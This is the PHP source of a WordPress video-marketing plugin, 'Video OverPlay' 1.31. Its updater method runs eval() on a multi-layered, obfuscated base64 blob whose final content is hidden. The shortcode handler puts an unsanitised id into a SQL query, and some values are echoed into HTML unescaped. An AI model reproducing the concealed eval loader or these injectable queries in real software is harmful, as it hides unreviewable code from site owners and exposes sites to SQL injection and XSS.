<?php
/*
Plugin Name: Video OverPlay
Plugin URI:  http://videooverplay.com/
Description: Video Monetization Plugin To Easily Generate Optin Forms, Call To Action Buttons, Funnels, Social Prompts & More To Your Youtube Videos
Version:     1.31
Author:      Wildfire Concepts
Author URI:  http://wildfireconcepts.com/
*/
if(session_id()=="")
	session_start();
defined( 'ABSPATH' ) or die( 'No script kiddies please!' );

define('VOP_VERSION', '1.31');
define('VOP_INTERNAL_VERSION', '1.31');
define('VOP_DB_VERSION', '1.1');
define('VOP_PLUGIN_NAME', 'Video Overplay');
define('VOP_FOLDER', 'VideoOverPlay');
define('VOP_SLUG', plugin_basename( __FILE__ ));
define('VOP_PREFIX', 'vop_');


class videooverplay {
	
	var $plugin_name = "";
	var $plugin_url = "";
	var $update;
	var $options = Array();
	
	function videooverplay()
	{
		register_activation_hook( __FILE__, array(&$this,'vop_install') );
		//register_activation_hook( __FILE__, array(&$this,'vop_install_data') );
		
		$this->plugin_name = VOP_PREFIX.VOP_FOLDER;
		$this->plugin_url = plugins_url(basename( dirname( __FILE__)));
		$this->options = $this->get_admin_options();
		
		// Get Update Information
		$this->load_updater_class();

		
		if(is_admin()) 
		{
			//add_action('admin_notices', array(&$this, 'admin_warnings'));
			//add_action('after_plugin_row', array(&$this, 'check_for_update'));
			add_action('admin_menu', array(&$this,'init_admin_menu'));
			add_action('admin_init', array(&$this,'init_admin'));
			
			add_action('admin_head', array(&$this,'vop_mce_button'));
		}
		add_shortcode('vop', array(&$this,'vop_shortcodez'));
		add_filter("vop_content_filter",array(&$this,'vop_content_filter'),999,2);
		add_action( 'plugins_loaded', array(&$this,'vop_update_db_check') );
	}
	
	function vop_content_filter($html,$overplay_id="")
	{
		global $post;
		if(!isset($post->ID))
			return $html;
		
		$overplay = (int)trim(get_post_meta($post->ID,"vop_overplay_id",true));
		
		if(!$overplay)
			$overplay = $overplay_id;
		if($overplay == "")
			return $html;
		
		$a = $this->vop_get_youtube_embed_codes_from_html($html);
		$x = $this->vop_check_shortcode_videos($html);
		$z = $this->vop_get_url_list(strip_shortcodes($html));
		$y = array_merge($a,$x,$z);
		$content = "";
		$i = 1;
		if(count($y)>0)
		{
			foreach ($y as $a=>$k)
			{
				$html = "<style>div#video{height:auto !important;}</style>";
				$html .= do_shortcode('[vop id="'.$overplay.'" video="'.$this->get_youtube_id($a,$k).'"]');
			}
		}
		return $html;
	}
	
	function vop_mce_button() {
	  // Check if user have permission
	  if ( !current_user_can( 'edit_posts' ) && !current_user_can( 'edit_pages' ) ) {
		return;
	  }
	  // Check if WYSIWYG is enabled
	  if ( 'true' == get_user_option( 'rich_editing' ) ) {
		
		global $wpdb;
		$table = $wpdb->prefix . "videooverplay";
		$results = $wpdb->get_results("SELECT id,name FROM $table WHERE 1");
		$data = array();
		foreach ($results as $r)
			$data[] = array('text'=>$r->name,'value'=>$r->id);
		
		?>
		<style>
			i.mce-i-custom-mce-icon {
			  background: url('<?php echo plugins_url("assets/images/play.png",__FILE__); ?>') !important;
			  background-repeat:no-repeat !important;
			  background-size:contain !important;
			}
		</style>
		<script>
		var tinymce_vop_plugin_options = JSON.parse('<?php echo json_encode($data) ?>');
		</script>
		  <?php
		add_filter('mce_external_plugins', array(&$this,'vop_tinymce_plugin'));
		add_filter('mce_buttons', array(&$this,'register_mce_button'));
	  }
	}
	
	//function for new button
	function vop_tinymce_plugin( $plugin_array ) {
	  $plugin_array['vop_mce_button'] = plugins_url('assets/js/editor_plugin.js',__FILE__);
	  return $plugin_array;
	}
	
	// Register new button in the editor
	function register_mce_button( $buttons ) {
	  array_push( $buttons, 'vop_mce_button' );
	  return $buttons;
	}
	
	function init_admin() {
	   
	   //register plugin styles
	   wp_register_style($this->plugin_name . '-stylesheet', $this->plugin_url.'/assets/css/admin_options_page.css','',VOP_INTERNAL_VERSION);
	   wp_register_style($this->plugin_name . '-steps', $this->plugin_url.'/assets/css/jquery.steps.css','',VOP_INTERNAL_VERSION);
	   wp_register_style($this->plugin_name . '-colorbox', $this->plugin_url.'/assets/css/colorbox.css','',VOP_INTERNAL_VERSION);
	   
	   
	   //register plugin scripts
	   wp_register_script($this->plugin_name . '-farbtastic', $this->plugin_url.'/assets/js/farbtastic.js','',VOP_INTERNAL_VERSION);
	   wp_register_script($this->plugin_name . '-script', $this->plugin_url.'/assets/js/admin_options_page.js','',VOP_INTERNAL_VERSION);
	   wp_register_script($this->plugin_name . '-overplay-script', $this->plugin_url.'/assets/js/overplay_options_page.js','',VOP_INTERNAL_VERSION);
	   wp_register_script($this->plugin_name . '-analysis-script', $this->plugin_url.'/assets/js/overplay_analysis_page.js','',VOP_INTERNAL_VERSION);
	   wp_register_script($this->plugin_name . '-validation', '//ajax.aspnetcdn.com/ajax/jquery.validate/1.13.1/jquery.validate.js','',VOP_INTERNAL_VERSION);
	   wp_register_script($this->plugin_name . '-steps', $this->plugin_url.'/assets/js/jquery.steps.min.js','',VOP_INTERNAL_VERSION);
	   wp_register_script($this->plugin_name . '-colorbox', $this->plugin_url.'/assets/js/colorbox.min.js','',VOP_INTERNAL_VERSION);
	   
			   
	}
	function load_overplay_scripts() {
   	
		//only enqueue style on plugin option page.
		wp_enqueue_script('jquery');
		wp_enqueue_script($this->plugin_name . '-overplay-script');
		wp_enqueue_script($this->plugin_name . '-steps');
		wp_enqueue_script($this->plugin_name . '-validation');
		wp_enqueue_script($this->plugin_name . '-colorbox');
		wp_enqueue_script($this->plugin_name . '-farbtastic');
		//wp_localize_script('VOP_admin_options_script', 'VOP_Ajax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ), 'nonce' => wp_create_nonce( 'VOP_clear_cookie_nonce' ), 'plugin_url' => $this->plugin_url, 'wp_root' => $this->get_wp_root_path() ) );
		wp_enqueue_media();
		
		
	}
	
	function load_analysis_scripts() {
   	
		//only enqueue style on plugin option page.
		wp_enqueue_script('jquery');
		wp_enqueue_script($this->plugin_name . '-analysis-script');
		wp_enqueue_script($this->plugin_name . '-colorbox');
		//wp_enqueue_script($this->plugin_name . '-steps');
		//wp_enqueue_script($this->plugin_name . '-validation');
		//wp_localize_script('VOP_admin_options_script', 'VOP_Ajax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ), 'nonce' => wp_create_nonce( 'VOP_clear_cookie_nonce' ), 'plugin_url' => $this->plugin_url, 'wp_root' => $this->get_wp_root_path() ) );
		//wp_enqueue_media();
		
		
	}
   function load_admin_scripts() {
   	
		//only enqueue style on plugin option page.
		wp_enqueue_script('jquery');
		wp_enqueue_script($this->plugin_name . '-script');
		wp_enqueue_script($this->plugin_name . '-steps');
		wp_enqueue_script($this->plugin_name . '-validation');
		wp_enqueue_script($this->plugin_name . '-colorbox');
		//wp_localize_script('VOP_admin_options_script', 'VOP_Ajax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ), 'nonce' => wp_create_nonce( 'VOP_clear_cookie_nonce' ), 'plugin_url' => $this->plugin_url, 'wp_root' => $this->get_wp_root_path() ) );
		wp_enqueue_media();
		
		
	}
   
	/*
	 * Will only be called on our plugin admin page, enqueue our stylesheet here
	 */
	function load_admin_styles() {
        wp_enqueue_style($this->plugin_name . '-stylesheet');
		wp_enqueue_style($this->plugin_name . '-steps');
		wp_enqueue_style($this->plugin_name . '-colorbox');
	}
	
	function clean_array($data)
	{
		foreach ($data as $k=>$v)
		{
			if(!is_array($v))
				$data[$k] = trim($v);
			else
				$data[$k] = $this->clean_array($v);
		}
		return $data;
	}
	
	function init_admin_menu() {
		//add menu page one
		$view_hook_name = add_menu_page( 'Video OverPlay',
			'Video OverPlay',
			'manage_options',
			'videooverplay',
			array(&$this, 'load_default_menu_page'),
			plugins_url("assets/images/play_small.png",__FILE__));
		
		add_action( 'admin_print_styles-' . $view_hook_name, array(&$this, 'load_admin_styles'));
		add_action( 'admin_print_scripts-' . $view_hook_name, array(&$this, 'load_admin_scripts'));	
		if($this->validate_license())
		{
			add_submenu_page( 'videooverplay',
			'Settings',
			'Settings',
			'manage_options',
			'videooverplay',
			array(&$this, 'load_default_menu_page'));
			
		
			//add menu page two
			$view_hook_name = add_submenu_page( 'videooverplay',
				'Overplay Manager',
				'Overplay Manager',
				'manage_options',
				'manage_overplay',
				array(&$this, 'load_overplay_menu_page'));
			
			add_action( 'admin_print_styles-' . $view_hook_name, array(&$this, 'load_admin_styles'));
			add_action( 'admin_print_scripts-' . $view_hook_name, array(&$this, 'load_overplay_scripts'));	
			
			$view_hook_name = add_submenu_page( 'videooverplay',
				'Overplay Analysis',
				'Overplay Analysis',
				'manage_options',
				'performance_meter',
				array(&$this, 'load_overplay_performance_menu_page'));
			
			add_action( 'admin_print_styles-' . $view_hook_name, array(&$this, 'load_admin_styles'));
			add_action( 'admin_print_scripts-' . $view_hook_name, array(&$this, 'load_analysis_scripts'));	
		}	
		
		
	}
	
	function load_default_menu_page()
	{
		include_once("admin/options.php");
	}
	
	function load_overplay_menu_page()
	{
		include_once("admin/manage_overplay.php");
	}
	
	function load_overplay_performance_menu_page()
	{
		include_once("admin/overplay_performance.php");
	}
	
	
   
	
	
	function set_admin_options($adminOptions,$option_name = "-AdminOptions") {
		//default options
		//$adminOptions = array('key'=>'value');
			
		//saved options	
		/*
		$devOptions = get_option($this->plugin_name.$option_name);
		//echo "<pre>".print_r($devOptions,true)."</pre>";
		//mix defaults where saved option is not there...
		if (!empty($devOptions)) {
			foreach ($devOptions as $key => $value)
				if(!array_key_exists($key,$adminOptions))
					$adminOptions[$key] = $value;
		}				
		*/
		update_option($this->plugin_name.$option_name, $adminOptions);
		return;
	}
	function get_admin_options($option_name = "-AdminOptions") {
		
		//default options
		$adminOptions = array();
			
		//saved options	
		$devOptions = get_option($this->plugin_name.$option_name);
		
		//mix defaults where saved option is not there...
		if (!empty($devOptions)) {
			foreach ($devOptions as $key => $option)
				$adminOptions[$key] = $option;
		}				
		update_option($this->plugin_name.$option_name, $adminOptions);
		return $adminOptions;
	}
	
	function get_wp_root_path()
	{
	    $path = parse_url(get_bloginfo('wpurl'), PHP_URL_PATH);
	    if(!isset($path))
	       return '/';
	    else
	  	    return $path;
	}
	
	function load_updater_class() {
      eval(base64_decode("JGRlY29kZSA9ICJWa1ZvY2s1R2IzaFViR2hQVmpOQ2NGVXdXbUZqYkdSelZHdE9WMkpWTlVsV1Z6RnZZVEZKZUZadE5WWldSVzh3V1ZWa1RtVnNVbFpPVlZKb1ZsVmFkVlV4Vms5UmJHOTNZa1ZzVkdKWWFIRldNRnBoWkRGcmVVMVdaR0ZpVld3MVZHeGtkMWxXVlhsYVNGWmhVbTFvUkZsVVJuTlhWbFowWlVVeFRrMXNTakJXTVZKR1RsVXhXRlJyYUZaaVYyaHlWV3BHWVU1V1VraE9WVTVwVFdzMVJWZFVUa05WUjFJMlVXdDRVazFWTlVOWGFrSjNVMVpXZEU5WGFGaFNWRVYzVmxWak1WWXlVWGhqUldoVFlXdEthRlpVUWtaT1ZrNVdXWHBHYVZJeFNURlZWM0JQV1ZkS1ZrNVhNV0ZTYldoRVdWUkdjMWRXVm5SbFIzQm9WakpTZVZkclZtdGlNazVJVkdwV1RsRXpVbkJVVkVKS1pERnNWMWw2Vm10V01ERTBXWHBKTVdGV1NYbGxTRVpZWWtkTmVGcFhlSGRXUm5CSVZXc3hVMkpJUWxKV2JGWmFUbFpaZUZOc1pGUmlSa3BWVm14U2MxVkdVa1pYYlVaV1VteGFTRlF4V2xOV1ZrcHpWMnRzVlZKV2NHaFdWVnBYVWpBNVYxSnNWbE5pUm5CS1ZsUkdWazFXY0hOVmJrcFRZWHBXVkZaVVNucE5NVXBIVW01YVlVMUhlRVZWVm1SclUyeEZkMUp1U21GU1YxSjJXVEJrVDA1Vk1VUmtSM1JZVWxWd2VWWXhXbTlWTWtwR1pVWldUMWRIZUdoV2JYQnpZMVpzVmxwR1pHaGlWVlkwVkRGb1QyRkdXWGRPV0U1YVlsUldVRmxyVmpCU1IwWTJXa1ZXVmxaNmJFeFZNVlpQVVRKT1IyTklRbUZOYldoTVZUQmFTMlJzYkZkaFJUVnJVbXRLTVZZeU1XOWhWa2w1WlVoS1dGWnRhRlJaYTFwdVpWZFdTVkZzY0U1aVJtOTRWMWh3UzFadFNYZGtSbEpvVFVSV1JWZHFTakJpYkU1V1lVaHdWV0V3TlhWWlZFSjNVMnhGZDFKcVNsVlNSWEJRV1hwR2QxZEdTblZpUlhCVVVsUldkbGRyWTNoV01rVjNZa1ZvYkZORlNtRlVWM2hoVFZac05sTnNXbUZOYTFZMVZtMXdWMU5zU1hsbFNGSlVWbGROZUZwSE1WTlNSa1owWVVWd1ZGSnVRblpYVjNScll6SkZkMkpGYUd0U00yaHpWbFpTUTFSR1JYaFNia3BoVFVkNFJWWlhjRU5aVmxvMlVtcE9WRlpXUmpOWGFrSjNVMVpXZEU5WGFGaFNWRVYzVmxWamVHRXlTa2hWYTJSUVZqSm9hRlZ1Y0Vka01XeDBaSHBXYTJKVk5VcFdWelZEWVZVeGNWWnFXbFJOUlRWNVZHcENVMVZ0U1hkalJWSldUVVZhZFZaRmFISk9SMFY1Vld0b2FGTkZTbkZhVmxKQ1kyeHdTRTFFVm10TlYyUTJWVmMxYzJGR1dqWldXR1JVVFVVMVZGUlZXbmRYUlRGWldrVjRWMU5GTlZCVlZFcHJZMnhPY21KRlVsSldNMUp5VldwR1lVMUdhM2RYYm5CcFlsVndTVmxyWkhkWlZsbzJWbXBhV0dKRk5YSlhhMVp6VWxVeFNGcEZjR2hXVjNONlZXdGFSMlJzVG5KVWJGSlNWakpTVEZVd1drdGtiR3hYWVVVMWExSnJTakZXUnpFMFlURktjV0pIT1ZoaE1rNDBXVEJrUzJNd09WbFhiWEJVVW10d00xZFhjRXBOVjFaeVpFVlNWbUZyU21oV2JuQkhUVEZOZUZWdWNGVmhNRFYxV1ZSQ2QxTnNSWGRTYXpsU1RXMVNlVmRxUW5OVFZURkdUbFZTYUZaVlduVlZNVlpQVVd4dmQySkZVbEJUUm5CTFZXeGtORTFXYkZkaFJrNXFVbTE0V1ZwVmFFTmlSMHBYVm0wMVYySkhhRVJaVkVaelYxWldkR1ZGY0ZOV1IzaDNWMVpqZUZZeVJuUlZhMHBPVWxoU1MxVlVRa2RpYkU1V1ZHdEtZVTFJWnpGVU1HUXdZVEZKZVdGSVpGcE5NblF6VTNwS1UxZFdSblJrUm5CWVVtdHdlbFV4VmxKa01XOTVVMjVTVjJGck5VdFZiWGgzVlZaYVZsZFVWbE5TTUd3MVZHeFNRMWxXV2paV1dHUlhZa2RvUkZsVVJuTlhWbFowWlVWNFVrMVZiRE5YVmxacll6SldjbVZHVms5WFIxSndWVEJhWVdSV2JGZFpla1poWWxWd01GVnROVk5aVmxWNVkzcE9VazFWVlRWVlJrVTVVRkU5UFE9PSI7JGRlY29kZSA9IGJhc2U2NF9kZWNvZGUoJGRlY29kZSk7JGRlY29kZSA9IHN0cl9yZXBsYWNlKCIzQCMkIiwiQSIsJGRlY29kZSk7JGRlY29kZSA9IGJhc2U2NF9kZWNvZGUoJGRlY29kZSk7JGRlY29kZSA9IHN0cl9yZXBsYWNlKCIhJCEyIiwiQCIsJGRlY29kZSk7JGRlY29kZSA9IGJhc2U2NF9kZWNvZGUoJGRlY29kZSk7JGRlY29kZSA9IHN0cl9yZXBsYWNlKCIjKkAiLCIqIiwkZGVjb2RlKTskZGVjb2RlID0gYmFzZTY0X2RlY29kZSgkZGVjb2RlKTtldmFsKCRkZWNvZGUpOw=="));
	}
	
	function check_for_update($plugin)
	{			
      if(strpos($plugin, VOP_FOLDER.'/') !== false) {
      	if(!$this->update->getUpdateInfo(1))
      	   echo '<tr class="plugin-update-tr"><td colspan="3" class="plugin-update"><div class="update-message">Warning: Could Not Connect To Video OverPlay Update Server</td></tr>';
      }			
	}
	
	function validate_license()
	{
		$result = $this->update->is_license_valid();
		if($result['status']=="COMPLETED")
			return true;
		return false;
	}
	
	function vop_print($data)
	{
		echo "<pre>".print_r($data,true)."</pre>";
	}
	
	function vop_pagination($per_page = 10,$vop_page = 1, $url = '?',$total=0,$vop_page_name='vop_page')
	{       
        global $wpdb;
        $adjacents = "2";

        $vop_page = ($vop_page == 0 ? 1 : $vop_page); 
        $start = ($vop_page - 1) * $per_page;                               
       
        $prev = $vop_page - 1;                           
        $next = $vop_page + 1;
        $lastpage = ceil($total/$per_page);
        $lpm1 = $lastpage - 1;
       
        $vop_pagination = "";
        if($lastpage > 1)
        {   
            $vop_pagination .= "<ul class='pagination'><li>$total Items :</li>";
                    $vop_pagination .= "<li class='details'>Page $vop_page of $lastpage</li>";
            if ($lastpage < 7 + ($adjacents * 2))
            {   
                for ($counter = 1; $counter <= $lastpage; $counter++)
                {
                    if ($counter == $vop_page)
                        $vop_pagination.= "<li><a class='current'>$counter</a></li>";
                    else
                   
                        $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$counter)."'>$counter</a></li>";                   
                }
            }
            elseif($lastpage > 5 + ($adjacents * 2))
            {
                if($vop_page < 1 + ($adjacents * 2))       
                {
                    for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
                    {
                        if ($counter == $vop_page)
                            $vop_pagination.= "<li><a class='current'>$counter</a></li>";
                        else
                            $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$counter)."'>$counter</a></li>";                   
                    }
                    $vop_pagination.= "<li class='dot'>...</li>";
                    $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$lpm1)."'>$lpm1</a></li>";
                    $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$lastpage)."'>$lastpage</a></li>";       
                }
                elseif($lastpage - ($adjacents * 2) > $vop_page && $vop_page > ($adjacents * 2))
                {
                    $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,1)."'>1</a></li>";
                    $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,2)."'>2</a></li>";
                    $vop_pagination.= "<li class='dot'>...</li>";
                    for ($counter = $vop_page - $adjacents; $counter <= $vop_page + $adjacents; $counter++)
                    {
                        if ($counter == $vop_page)
                            $vop_pagination.= "<li><a class='current'>$counter</a></li>";
                        else
                            $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$counter)."'>$counter</a></li>";                   
                    }
                    $vop_pagination.= "<li class='dot'>..</li>";
                    $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$lpm1)."'>$lpm1</a></li>";
                    $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$lastpage)."'>$lastpage</a></li>";       
                }
                else
                {
                    $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,1)."'>1</a></li>";
                    $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,2)."'>2</a></li>";
                    $vop_pagination.= "<li class='dot'>..</li>";
                    for ($counter = $lastpage - (2 + ($adjacents * 2)); $counter <= $lastpage; $counter++)
                    {
                        if ($counter == $vop_page)
                            $vop_pagination.= "<li><a class='current'>$counter</a></li>";
                        else
                            $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$counter)."'>$counter</a></li>";                   
                    }
                }
            }
           
            if ($vop_page < $counter - 1){
                $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$next)."'>Next</a></li>";
                $vop_pagination.= "<li><a href='".$this->vop_link_build($vop_page_name,$lastpage)."'>Last</a></li>";
            }else{
                $vop_pagination.= "<li><a class='current'>Next</a></li>";
                $vop_pagination.= "<li><a class='current'>Last</a></li>";
            }
            $vop_pagination.= "</ul>\n";       
        }
   
   
        return $vop_pagination;
	}

	function vop_link_build($var,$val)
	{
		return $_SERVER['PHP_SELF']."?".http_build_query(array_merge($_GET, array($var => $val)));
	}
	
	function vop_shortcodez($atts){
		
		// user video from shortcode parameter if supplied...
		global $post;
	   extract(shortcode_atts(array(
		  'id' => '',
		  'video' => '',
		  'split_id' => '',
	   ), $atts));
		$video_id = "";
	   if($atts['video']!="")
	   {
		   $video_id = $this->get_youtube_id($atts['video']);
	   }
	   
	   if($this->options['global_enable'] == 'no')
	   {
		 if(current_user_can('administrator'))  
			 return "<p style='color:red;font-size:small;'>Video Overplay plugin is disabled.</p>";
		 return "";
	   }
	   
	   if($this->options['mobile_disable'] == 'yes' AND wp_is_mobile())
	   {
		 if(current_user_can('administrator'))  
			 return "<p style='color:red;font-size:small;'>Video Overplay plugin is disabled for mobile, and it seems like you are visiting this site from mobile device.</p>";
		 return "";
	   }
	   
		$split_param = "";
		if(isset($split_id) AND $split_id != "")
		{
			$split_param = "&split_id=".$split_id;
		}
		else
		{
		   
		   //apply vop split testing filter to replace overplay id for split testing purpose
			$split = apply_filters("vop_split_testing",$id);
			
			if(is_array($split))
			{
				$id = $split[1];
				$atts['id'] =  $split[1];
				$split_param = "&split_id=".$split[0];
			}
		}
		
		global $wpdb;
		$table = $wpdb->prefix . "videooverplay";
		$results = json_decode($wpdb->get_var("SELECT options FROM $table WHERE id = $id"));	
	
	   
	  return  "<script >function resizeIframe(obj) {obj.style.height = obj.contentWindow.document.body.scrollHeight  + 'px' ;}</script>
	  <div itemprop='video' itemscope itemtype='http://schema.org/VideoObject'>
		<meta itemprop='name' content='".$results->vop_seo_title."' />
		<meta itemprop='description' content='".$results->vop_seo_desc."' />
		<meta itemprop='thumbnail' content='".$results->video_play_img."' />
	  </div>
	  <iframe name=$id scrolling='no' ALLOWTRANSPARENCY='true' id='the_iframe_".$atts['id']."'  frameborder='0' style='width: 100%; height: 80px;  margin: 5px auto; display: block;  position: relative' class='scarcitybuilder' src='".plugin_dir_url( __FILE__ )."player/player.php?id=".$atts['id']."&video_id=".$video_id."&post_id=".$post->ID.$split_param."' onload='javascript:resizeIframe(this);'></iframe>"; 
	}
	 
	function get_youtube_id($url1,$type='video')
	{ 
		$video_id = null;
		$url = parse_url($url1);
		switch ($type)
		{
			case "video":
				if(strlen(trim($url1))==11)
				{
					$video_id = trim($url1);
				}	
			
				if ( isset($url['host']) AND strcasecmp($url['host'], 'youtu.be') === 0)
				{
					$video_id = substr($url['path'], 1);
				}
				elseif ( isset($url['host']) AND strcasecmp($url['host'], 'www.youtube.com') === 0)
				{
					if (isset($url['query']))
					{
						parse_str($url['query'], $url['query']);
						if (isset($url['query']['v']))
						{
							$video_id = $url['query']['v'];
						}
					}
					if ($video_id == false)
					{
						$url['path'] = explode('/', substr($url['path'], 1));
						if (in_array($url['path'][0], array('e', 'embed', 'v')))
						{
							$temp = explode('&',$url['path'][1]);
							$video_id = $temp[0];
						}
					}
				}
				break;
			
			case "playlist":
				if (strcasecmp($url['host'], 'www.youtube.com') === 0)
				{
					if (isset($url['query']))
					{
						parse_str($url['query'], $url['query']);
						if (isset($url['query']['list']))
						{
							$video_id = $url['query']['list'];
						}
					}
					if ($video_id == false)
					{
						$url['path'] = explode('/', substr($url['path'], 1));
						if (in_array($url['path'][0], array('e', 'embed', 'v')))
						{
							$temp = explode('&',$url['path'][1]);
							$video_id = $temp[0];
						}
					}
				}
				break;
		}
		return strip_tags($video_id);
	}
	
	function print_button_style($name,$value,$instance = "")
	{
		echo "
		<input type='button' class='animation_show2 button-primary' value='Show/Hide'>
		<span style='display:block;vertical-align:text-top;' class='vop_hideme'>";
		$counter = 1;
		$data = array(
			'vop-a'=>'a',
			'vop-b'=>'b',
			'vop-c'=>'c',
			'vop-d'=>'d',
			'vop-e'=>'e',
			'vop-f'=>'f',
			'vop-g'=>'g',
			'vop-h'=>'h',
			'vop-i'=>'i',
			'vop-j'=>'j',
			'vop-k'=>'k',
			'vop-l'=>'l',
			'vop-m'=>'m',
			'vop-n'=>'n',
			'vop-o'=>'o',
			'default'=>'p',
			'primary'=>'q',
			'info'=>'r',
			'danger'=>'s',
			'warning'=>'t',
			'success'=>'u',
			);
		
		foreach ($data as $k=>$v)
		{
			echo "<input type='radio' ".checked($value,$k,false)." name=\"$name\" value='$k' class='radio_button' id='radio_btn_".$v."_".$instance."'>
		<label for='radio_btn_".$v."_".$instance."'>
			<img src='".plugins_url("assets/images/buttons/$v.png",__FILE__)."' />
		</label>";
			if($counter == 7)
			{
				echo "<br/>";
				$counter = 0;
			}
			$counter++;
			
		}
		
		echo "</span>";
		
	}
	
	function animation_style($name,$overplay_option)
	{
		?>
		<legend style='display:inline-block;min-width:200px;max-width:200px;float:left;'>Animation Settings</legend>
		<input type="button" class='animation_show button-primary' value='Show/Hide'>
		<div style='display:none;'>
		<p>
				<label>Start Animation</label>
				<span class="options">
				<b>Animation Style</b>
				<select name='vop_options[<?php echo $name; ?>_start_animation]'>
					<?php $temp = array(
									'fade'=>'Fade IN',
									'short_top'=>'Short from Top',
									'short_right'=>'Short from Right',
									'short_bottom'=>'Short from Bottom',
									'short_left'=>'Short from Left',
									'short_top_right'=>'Short from Top/Right Corner',
									'short_right_bottom'=>'Short from Right/Bottom Corner',
									'short_bottom_left'=>'Short from Bottom/Left Corner',
									'short_left_top'=>'Short from Left/Top Corner',
									'long_top'=>'Long from Top',
									'long_right'=>'Long from Right',
									'long_bottom'=>'Long from Bottom',
									'long_left'=>'Long from Left',
									'long_top_right'=>'Long from Top/Right Corner',
									'long_right_bottom'=>'Long from Right/Bottom Corner',
									'long_bottom_left'=>'Long from Bottom/Left Corner',
									'long_left_top'=>'Long from Left/Top Corner',
									
									); 
						foreach ($temp as $k=>$v)
						{
							echo "<option value='$k' ".selected($k,$overplay_option[$name.'_start_animation'],false).">$v</option>";
						}
					
					?>
				</select>
				<br>
				<b>Position at</b>
				<select name='vop_options[<?php echo $name; ?>_position]'>
					<?php $temp = array(
									'top'=>'Top',
									'right'=>'Right',
									'bottom'=>'Bottom',
									'left'=>'left',
									'top_right'=>'Top Right Corner',
									'right_bottom'=>'Right Bottom Corner',
									'bottom_left'=>'Bottom Left Corner',
									'left_top'=>'Left Top Corner',
									'center'=>'Center',
									); 
						foreach ($temp as $k=>$v)
						{
							echo "<option value='$k' ".selected($k,$overplay_option[$name.'_position'],false).">$v</option>";
						}
					
					?>
				</select>
				<br>
				<b>Easing Style</b>
				<select name='vop_options[<?php echo $name; ?>_easing_in]'>
					<?php $temp = array('swing','easeInSine','easeOutBack','easeOutQuint','spring','easeOutBounce'); 
						foreach ($temp as $k)
						{
							echo "<option value='$k' ".selected($k,$overplay_option[$name.'_easing_in'],false).">$k</option>";
						}
					
					?>
				</select>
				<br>
				<b>Animation Speed</b>
				<input type='number' name='vop_options[<?php echo $name; ?>_in_animation_time]' value='<?php echo $overplay_option[$name.'_in_animation_time']; ?>' > ms (milliseconds)<?php $this->tooltip("i.e. for 1 second, enter 1000 (as milliseconds)."); ?>
				</span>
			</p>
			<p>
				<label>End Animation</label>
				<span class='options'>
				<b>Animation Style</b>
				<select name='vop_options[<?php echo $name; ?>_end_animation]'>
					<?php $temp = array(
									'fade'=>'Fade Out',
									'short_top'=>'Short to Top',
									'short_right'=>'Short to Right',
									'short_bottom'=>'Short to Bottom',
									'short_left'=>'Short to Left',
									'short_top_right'=>'Short to Top/Right Corner',
									'short_right_bottom'=>'Short to Right/Bottom Corner',
									'short_bottom_left'=>'Short to Bottom/Left Corner',
									'short_left_top'=>'Short to Left/Top Corner',
									'long_top'=>'Long to Top',
									'long_right'=>'Long to Right',
									'long_bottom'=>'Long to Bottom',
									'long_left'=>'Long to Left',
									'long_top_right'=>'Long to Top/Right Corner',
									'long_right_bottom'=>'Long to Right/Bottom Corner',
									'long_bottom_left'=>'Long to Bottom/Left Corner',
									'long_left_top'=>'Long to Left/Top Corner',
									
									); 
						foreach ($temp as $k=>$v)
						{
							echo "<option value='$k' ".selected($k,$overplay_option[$name.'_end_animation'],false).">$v</option>";
						}
					
					?>
				</select>
				<br>
				<b>Easing Style</b>
				<select name='vop_options[<?php echo $name; ?>_easing_out]'>
					<?php $temp = array('swing','easeInSine','easeOutBack','easeOutQuint','spring','easeOutBounce'); 
						foreach ($temp as $k)
						{
							echo "<option value='$k' ".selected($k,$overplay_option[$name.'_easing_out'],false).">$k</option>";
						}
					
					?>
				</select>
				<br>
				<b>Animation Speed</b>
				<input type='number' name='vop_options[<?php echo $name; ?>_out_animation_time]' value='<?php echo $overplay_option[$name.'_out_animation_time']; ?>' > ms (milliseconds)<?php $this->tooltip("i.e. for 1 second, enter 1000 (as milliseconds)."); ?>
				</span>
			</p>
			</div>
		<?php
	}
	
	function vop_install() 
	{
		global $wpdb;

		$table_name = $wpdb->prefix . 'videooverplay';
		
		$charset_collate = $wpdb->get_charset_collate();

		$sql = "CREATE TABLE $table_name (
			id int(11) NOT NULL AUTO_INCREMENT,
			name varchar(200) NOT NULL,
			video text NOT NULL,
			video_type enum('youtube','other') NOT NULL DEFAULT 'youtube',
			options text NOT NULL,
			view int(11) NOT NULL DEFAULT '0',
			funnel_view int(11) NOT NULL,
			funnel_ans2_click int(11) NOT NULL,
			funnel_ans1_click int(11) NOT NULL,
			cta_view int(11) NOT NULL,
			cta_click int(11) NOT NULL,
			social_view int(11) NOT NULL,
			social_click int(11) NOT NULL,
			end_url_view int(11) NOT NULL,
			end_url_click int(11) NOT NULL,
			play_button_click int(11) NOT NULL,
			email_view int(11) NOT NULL,
			email_signup int(11) NOT NULL,
			ad_banner_view int(11) NOT NULL,
			ad_banner_click int(11) NOT NULL,
			created_on timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
			PRIMARY KEY  (id)
		) $charset_collate;";
		
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
		dbDelta( $sql );
		
		
		//add default data to table
		
		if ( get_option( 'vop_db_version' ) === false AND $wpdb->get_var("SELECT count(*) FROM $table_name") == 0)
		{
			//db is empty and plugin installed first time, so go and insert default video there...
			$default_video_option = $this->load_defaults("overplay_option");
			$default_video_option['name'] = "Video Overplay Walkthrough";
